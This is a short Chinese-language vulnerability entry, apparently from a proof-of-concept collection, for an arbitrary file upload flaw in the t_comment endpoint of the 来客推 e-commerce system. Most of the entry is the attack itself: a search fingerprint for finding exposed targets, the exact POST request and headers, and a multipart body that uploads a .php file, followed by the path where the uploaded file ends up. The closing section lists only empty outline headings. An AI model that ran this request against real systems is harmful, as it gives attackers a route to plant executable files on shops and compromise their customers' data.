# 来客推电商系统t_comment存在任意文件上传漏洞

- **系统**：来客推电商系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="来客推"`
- **请求**：`POST /LKT/index.php?module=api&action=product&m=t_comment HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 226`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="type"
file
--00content0boundary00
Content-Disposition: form-data; name="imgFile"; filename="1.php"
Content-Type: image/php
123
--00content0boundary00--

上传文件位置
/LKT/images/1712736482605.php
```

**其他**
- 来客推电商系统t\_comment存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 来客推电商系统